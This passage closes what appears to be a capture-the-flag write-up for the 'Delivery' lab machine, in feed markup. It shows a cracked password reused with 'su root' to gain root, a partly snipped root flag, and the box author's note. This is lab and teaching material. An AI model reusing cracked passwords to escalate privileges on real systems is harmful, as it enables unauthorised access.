-Time.Estimated...: Mon Mar <span style="color:#ae81ff">15</span> 21:36:36 <span style="color:#ae81ff">2021</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
-....
-</code></pre></div><p>The recovered password is <code>PleaseSubscribe!21</code>.</p>
-<h4 id="su---root">SU - root</h4>
-<p>That password works on root user.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">maildeliverer@Delivery:~$ su root
-Password: 
-root@Delivery:/home/maildeliverer# id
-uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
-</code></pre></div><p>Now I can just grab the root flag.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@Delivery:/home/maildeliverer# cd ~
-root@Delivery:~# ls -l
-total 16
--rwxr-x--- 1 root root  103 Dec 26 11:26 mail.sh
--r-------- 1 root root  382 Dec 28 07:02 note.txt
--rw-r----- 1 root root 1499 Dec 26 10:55 py-smtp.py
--r-------- 1 root root   33 May 21 11:21 root.txt
-root@Delivery:~# cat *.txt
-I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I&#39;ve seen several times.  The inspiration for the box is here: 
-
-- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c 
-
-Keep on hacking! And please don&#39;t forget to subscribe to all the security streamers out there.
-
-- ippsec
-a7d68baadc3b3c072c6...&lt;SNIP&gt;...
-</code></pre></div><p>There is also a message from the <a href="https://www.youtube.com/c/ippsec/videos">box’s author</a>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@Delivery:~# cat note.txt
-I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I&#39;ve seen several times. The inspiration for the box is here:
-
-- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c
-
-Keep on hacking! And please don&#39;t forget to subscribe to all the security streamers out there.
-</code></pre></div><hr>
-<h2 id="references">References</h2>
-<ul>
-<li><a href="https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c">https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c</a></li>
 </ul>
 ]]></content:encoded>
     </item>
